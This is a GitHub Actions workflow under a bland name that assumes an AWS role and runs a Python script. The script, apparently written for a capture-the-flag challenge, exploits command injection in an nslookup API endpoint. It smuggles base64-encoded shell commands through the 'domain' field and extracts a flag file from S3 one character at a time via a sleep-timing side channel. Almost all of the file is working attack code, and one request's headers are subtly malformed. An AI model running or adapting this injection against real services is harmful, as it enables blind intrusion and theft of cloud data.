name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Exfiltrate Flag via Pure Python Brute-Force Side-Channel
        run: |
          python3 << 'PYEOF'
          import urllib.request
          import urllib.error
          import json
          import time
          import base64

          url = "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"

          print("=== STEP 1: TRUE ZERO-SLEEP BASELINE CALIBRATION ===")
          cal_script = 'FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c1); ORD=$(echo -n "$CHAR" | od -An -tuC | xargs); if [ "$ORD" -gt 999 ]; then sleep 2; fi'
          cal_encoded = base64.b64encode(cal_script.encode('utf-8')).decode('utf-8')
          
          start = time.time()
          req = urllib.request.Request(
              url,
              data=json.dumps({"domain": f"127.0.0.1; echo {cal_encoded} | base64 -d | sh"}).encode('utf-8'),
              headers={'Content-Type': 'application/json'},
              method='POST'
          )
          try:
              with urllib.request.urlopen(req, timeout=10) as resp:
                  resp.read()
          except Exception:
              pass
          baseline_ms = (time.time() - start) * 1000.0
          threshold = baseline_ms + 1200
          print(f"True zero-sleep baseline: {baseline_ms:.1f}ms. Using threshold: {threshold:.1f}ms (baseline + 1200ms)")

          print("\n=== STEP 2: LINEAR CHARSET BRUTE-FORCE (PURE PYTHON) ===")
          charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-%"
          flag_chars = []

          for pos in range(1, 17):
              found = False
              for char in charset:
                  script = f'FLAG=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); CHAR=$(echo "$FLAG" | cut -c{pos}); if [ "$CHAR" = "{char}" ]; then sleep 2; fi'
                  encoded = base64.b64encode(script.encode('utf-8')).decode('utf-8')
                  
                  start = time.time()
                  req = urllib.request.Request(
                      url,
                      data=json.dumps({"domain": f"127.0.0.1; echo {encoded} | base64 -d | sh"}).encode('utf-8'),
                      headers={'Content-Type: application/json'},
                      method='POST'
                  )
                  
                  code = 200
                  try:
                      with urllib.request.urlopen(req, timeout=10) as resp:
                          resp.read()
                  except urllib.error.HTTPError as e:
                      code = e.code
                  except Exception:
                      code = 504

                  duration_ms = (time.time() - start) * 1000.0
                  
                  if code in (504, 503) or duration_ms >= threshold:
                      flag_chars.append(char)
                      current_flag = "".join(flag_chars)
                      print(f">>> Position {pos}: found character '{char}' | Flag so far: {current_flag} (took {duration_ms:.1f}ms)")
                      found = True
                      break
              
              if not found:
                  print(f">>> Position {pos}: character not matched, appending '?'")
                  flag_chars.append('?')

          encoded_flag = "".join(flag_chars)
          print(f"\n==================== FINAL ENCODED FLAG ====================")
          print(encoded_flag)
          print(f"============================================================")
          
          decoded_flag = urllib.parse.unquote(encoded_flag)
          print(f"PLAINTEXT FLAG: {decoded_flag}")
          PYEOF
